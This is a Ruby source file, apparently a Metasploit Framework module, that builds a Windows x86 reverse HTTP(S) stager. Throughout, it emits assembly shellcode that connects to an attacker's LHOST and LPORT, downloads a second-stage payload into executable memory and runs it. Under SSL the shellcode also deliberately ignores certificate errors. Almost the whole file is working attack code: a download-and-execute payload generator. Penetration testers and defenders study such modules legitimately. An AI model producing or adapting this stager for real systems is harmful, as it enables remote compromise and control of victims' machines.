# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/block_api'
require 'msf/core/payload/windows/exitfunk'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
#
###


module Payload::Windows::ReverseHttp

  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi
  include Msf::Payload::Windows::Exitfunk

  #
  # Register reverse_http specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (at least 5 bytes)'])
      ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate
    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_http(
        ssl:  false,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW))
    end

    conf = {
      ssl:  false,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_http(conf)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_http(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_http(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_uri

    uri_req_len = datastore['HTTPStagerURILength'].to_i

    # Choose a random URI length between 30 and 255 bytes
    if uri_req_len == 0
      uri_req_len = 30 + rand(256-30)
    end

    if uri_req_len < 5
      raise ArgumentError, "Minimum HTTPStagerURILength is 5"
    end

    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, uri_req_len)
  end

  #
  # Generate the URI for the initial stager
  #
  def generate_small_uri
    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length
    space += 256

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # The final estimated size
    space
  end

  #
  # Dynamic payload generation
  #
  def asm_reverse_http(opts={})

    #
    # options should contain:
    #    ssl:     (true|false)
    #    url:     "/url_to_request"
    #   host:     [hostname]
    #   port:     [port]
    # exitfunk:   [process|thread|seh|sleep]
    #

    http_open_flags = 0

    if opts[:ssl]
        #;0x80000000 | ; INTERNET_FLAG_RELOAD
        #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
        #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
        #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
        #;0x00000200 | ; INTERNET_FLAG_NO_UI
        #;0x00800000 | ; INTERNET_FLAG_SECURE
        #;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
        #;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000 )
    else
      #;0x80000000 | ; INTERNET_FLAG_RELOAD
      #;0x04000000 | ; INTERNET_NO_CACHE_WRITE
      #;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION
      #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
      #;0x00000200   ; INTERNET_FLAG_NO_UI
      http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
    end

    asm = %Q^
      ;-----------------------------------------------------------------------------;
      ; Author: HD Moore
      ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
      ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
      ; Version: 1.0
      ;-----------------------------------------------------------------------------;

      ; Input: EBP must be the address of 'api_call'.
      ; Output: EDI will be the socket for the connection to the server
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
      load_wininet:
        push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
        push 0x696e6977        ; ...
        push esp               ; Push a pointer to the "wininet" string on the stack.
        push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
        call ebp               ; LoadLibraryA( "wininet" )

      set_retry:
        push.i8 8              ; retry 8 times should be enough
        pop edi
        xor ebx, ebx           ; push 8 zeros ([1]-[8])
        mov ecx, edi
      push_zeros:
        push ebx
        loop push_zeros

      internetopen:
                               ; DWORD dwFlags [1]
                               ; LPCTSTR lpszProxyBypass (NULL) [2]
                               ; LPCTSTR lpszProxyName (NULL) [3]
                               ; DWORD dwAccessType (PRECONFIG = 0) [4]
                               ; LPCTSTR lpszAgent (NULL) [5]
        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
        call ebp

      internetconnect:
                               ; DWORD_PTR dwContext (NULL) [6]
                               ; dwFlags [7]
        push.i8 3              ; DWORD dwService (INTERNET_SERVICE_HTTP)
        push ebx               ; password (NULL)
        push ebx               ; username (NULL)
        push #{opts[:port]}    ; PORT
        call got_server_uri    ; double call to get pointer for both server_uri and
      server_uri:              ;  server_host; server_uri is saved in EDI for later
        db "#{opts[:url]}", 0x00
      got_server_host:
        push eax               ; HINTERNET hInternet
        push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
        call ebp

      httpopenrequest:
                               ; dwContext (NULL) [8]
        push #{"0x%.8x" % http_open_flags}   ; dwFlags
        push ebx               ; accept types
        push ebx               ; referrer
        push ebx               ; version
        push edi               ; server URI
        push ebx               ; method
        push eax               ; hConnection
        push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
        call ebp
        xchg esi, eax          ; save hHttpRequest in esi

      send_request:
      ^

    if opts[:ssl]
      asm << %Q^
        ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
        set_security_options:
          push 0x00003380
            ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
            ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
            ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
            ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
            ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
          mov eax, esp
          push.i8 4              ; sizeof(dwFlags)
          push eax               ; &dwFlags
          push.i8 31             ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
          push esi               ; hHttpRequest
          push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
          call ebp
        ^
    end

    asm << %Q^
      httpsendrequest:
        push ebx               ; lpOptional length (0)
        push ebx               ; lpOptional (NULL)
        push ebx               ; dwHeadersLength (0)
        push ebx               ; lpszHeaders (NULL)
        push esi               ; hHttpRequest
        push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
        call ebp
        test eax,eax
        jnz allocate_memory

      try_it_again:
        dec edi
        jnz send_request

      ; if we didn't allocate before running out of retries, bail out
      ^

      if opts[:exitfunk]
        asm << %Q^
          failure:
            call exitfunk
          ^
      else
        asm << %Q^
          failure:
            push 0x56A2B5F0        ; hardcoded to exitprocess for size
            call ebp
          ^
      end

      asm << %Q^
        allocate_memory:
          push.i8 0x40           ; PAGE_EXECUTE_READWRITE
          push 0x1000            ; MEM_COMMIT
          push 0x00400000        ; Stage allocation (4Mb ought to do us)
          push ebx               ; NULL as we dont care where the allocation is
          push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
          call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

        download_prep:
          xchg eax, ebx          ; place the allocated base address in ebx
          push ebx               ; store a copy of the stage base address on the stack
          push ebx               ; temporary storage for bytes read count
          mov edi, esp           ; &bytesRead

        download_more:
          push edi               ; &bytesRead
          push 8192              ; read length
          push ebx               ; buffer
          push esi               ; hRequest
          push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
          call ebp

          test eax,eax           ; download failed? (optional?)
          jz failure

          mov eax, [edi]
          add ebx, eax           ; buffer += bytes_received

          test eax,eax           ; optional?
          jnz download_more      ; continue until it returns 0
          pop eax                ; clear the temporary storage

        execute_stage:
          ret                    ; dive into the stored stage address

        got_server_uri:
          pop edi
          call got_server_host

        server_host:
          db "#{opts[:host]}", 0x00
        ^

      if opts[:exitfunk]
        asm << asm_exitfunk(opts)
      end
    asm
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end


end

end

